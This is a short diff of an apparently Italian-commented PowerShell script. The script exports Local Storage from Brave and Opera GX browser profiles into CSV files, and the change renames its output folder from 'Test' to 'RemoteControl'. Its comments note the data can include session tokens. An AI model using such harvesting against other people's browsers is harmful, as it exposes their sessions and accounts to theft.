@@ -13,7 +13,7 @@
   - Chiudi Brave e Opera GX prima di eseguire lo script: se il browser e'
     aperto, alcuni file possono essere bloccati e la copia di quel profilo
     fallisce (lo script continua comunque con gli altri profili).
-  - I CSV finiscono in: C:\ProgramData\Test\<Browser>\<Profilo>.csv
+  - I CSV finiscono in: C:\ProgramData\RemoteControl\<Browser>\<Profilo>.csv
     (una sottocartella per browser, un CSV per profilo)
   - Il Local Storage puo' contenere token di sessione o altri dati sensibili
     dei siti che hai visitato: tratta i CSV generati di conseguenza.
@@ -21,7 +21,7 @@
 
 $ErrorActionPreference = "Stop"
 
-$outDir  = "C:\ProgramData\Test"
+$outDir  = "C:\ProgramData\RemoteControl"
 $workDir = Join-Path $env:TEMP "ls_export_$(Get-Random)"
 New-Item -ItemType Directory -Force -Path $outDir  | Out-Null
 New-Item -ItemType Directory -Force -Path $workDir | Out-Null
